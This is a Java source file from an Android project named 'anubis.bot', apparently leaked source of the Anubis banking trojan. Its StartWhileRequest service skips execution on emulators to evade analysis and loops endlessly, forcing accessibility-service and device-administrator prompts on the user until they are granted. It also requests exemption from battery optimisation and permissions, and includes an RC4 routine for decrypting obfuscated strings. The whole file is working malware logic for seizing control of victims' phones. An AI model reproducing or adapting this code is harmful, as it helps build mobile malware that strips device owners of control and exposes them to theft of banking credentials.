package anubis.bot.myapplication;

import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.Admin.ActivityAdmin;
import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.Activity.ActivityAccessibility;
import anubis.bot.myapplication.API.Admin.ReceiverDeviceAdmin;


public class StartWhileRequest extends IntentService {

    Constants const_ = new Constants();
    StoreStringClass store = new StoreStringClass();
    int interval;
    boolean adminStart;
    int tik = 0;
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public StartWhileRequest() {
        super("StartWhileRequest");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if(SF.isEmulator())return;
        if(const_.DeviceAdmin==0)
            adminStart=false;
        else if(const_.DeviceAdmin==1)
            adminStart=true;
        else if(const_.DeviceAdmin==2){
            if (Build.VERSION.SDK_INT <= 23)
                adminStart=true;
            else
                adminStart=false;
        }
        int t=0;
        String getParams="";
        try{
         getParams = SF.SetRead(this, "startRequest");}catch (Exception ex){}
        while(true){
            interval=700;
            if (t == 0){
                try{getParams = SF.SetRead(this, "startRequest");}catch (Exception ex){}
            }if (t >= 5) t = -1;
            t++;

            boolean Accessibility =false;
            boolean Permision = false;
            if(getParams.contains("Access=1")){Accessibility=true;}
            if(getParams.contains("Perm=1")){Permision=true;}

            //************проверка ClassAdmin прав**********
            DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(this, ReceiverDeviceAdmin.class);

            try {TimeUnit.MILLISECONDS.sleep(interval);} catch (InterruptedException e) {e.printStackTrace();}

            KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            boolean locked = km.inKeyguardRestrictedInputMode();
            if (locked == false) {

                boolean checkAc = false;

                if(!SF.SetRead(this, "isAccessbility").contains("false")){
                    checkAc = true;
                }

                if ((!(checkAc) && (const_.StartRequest == 1))
                        || ((!checkAc) && (const_.StartRequest == 5))
                        || ((!checkAc) && (const_.StartRequest == 6))
                        || ((!checkAc) && (Accessibility))) {

                   // if(!SF.checkAccess(this)) {
                      if(SF.SetRead(this, "isAccessbility").contains("false")){
                        Intent dialogIntent = new Intent(this, ActivityAccessibility.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        //   dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                        interval = 500;
                        if (tik == 0) startService(new Intent(this, ServiceToast.class));
                        tik++;
                        if (tik > 25) tik = -1;
                        continue;

                    }

                }
            }

            if ((!deviceManager.isAdminActive(componentName))&&(adminStart)){
                Intent dialogIntent = new Intent(this, ActivityAdmin.class);
                dialogIntent.putExtra("str","start");
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(dialogIntent);
                continue;
            }


            //---Пермиши---
            if (((locked == false)&&(const_.StartRequest==1))
                    ||((locked == false)&&(const_.StartRequest==4))
                    ||((locked == false)&&(Permision))){
                interval=20000;
                if (Build.VERSION.SDK_INT >= 23) {


                    //Permission
                    if (!SF.hasPermissions(this)) {
                        //Doze mode
                        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);//Состояние Doze
                        boolean inWhiteList = powerManager.isIgnoringBatteryOptimizations(getPackageName());

                        if(!inWhiteList) {
                            try {
                                Intent intent1 = new
                                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                        Uri.parse("package:" + getPackageName()));
                                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                //   intent1.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                startActivity(intent1);
                            }catch (Exception ex){
                                SF.Log("ERROR","Doze Request");
                            }
                        }


                        try {
                            int getTimeWork = Integer.parseInt(SF.SetRead(this, "time_work"));
                            int getStartPermission = Integer.parseInt(SF.SetRead(this, "time_start_permission"));

                            if(getTimeWork>getStartPermission){
                                SF.startPermission(this);
                                continue;
                            }
                        }catch (Exception ex){}
                    }
                }

            }
        }

    }
}
